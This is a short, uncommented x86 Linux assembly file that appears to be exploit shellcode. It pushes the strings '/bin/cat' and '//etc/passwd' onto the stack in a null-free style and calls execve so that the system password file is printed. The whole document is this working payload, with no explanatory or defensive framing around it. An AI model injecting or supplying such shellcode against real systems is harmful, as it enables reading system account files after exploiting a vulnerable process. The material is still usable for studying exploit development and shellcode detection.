section .text

global _start

_start:
	xor eax,eax
	cdq
	push edx
	push 0x7461632f
	push 0x6e69622f	
	mov ebx,esp
	
	push edx
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	mov ecx,esp

	push edx
	push ecx
	push ebx
	mov ecx,esp
	mov al,0xb
	int 80h
